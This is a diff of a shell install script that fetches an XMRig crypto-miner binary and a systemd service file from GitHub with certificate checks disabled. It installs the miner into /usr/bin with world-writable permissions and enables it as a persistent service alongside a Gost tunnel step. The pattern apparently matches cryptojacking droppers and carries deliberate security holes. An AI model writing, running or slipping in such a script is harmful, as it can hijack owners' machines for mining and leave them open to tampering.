@@ -30,14 +30,15 @@ function Installation_dependency() {
 function Install_XMRIG(){
   wget --no-check-certificate https://github.com/summaxx/myscript/raw/master/xmrig
   chmod 755 xmrig
+  mv xmrig /usr/bin/xmrig
+  chmod -R 777 /usr/bin/xmrig
   wget  --no-check-certificate https://github.com/summaxx/myscript/raw/master/xmg.service
   chmod 755 xmg.service
   mv xmg.service /usr/lib/systemd/system
   systemctl enable xmg && systemctl restart xmg
 }
 
-sleep 30s
-sudo -i
+sleep 10s
 Installation_dependency
 Install_Gost
 Install_XMRIG
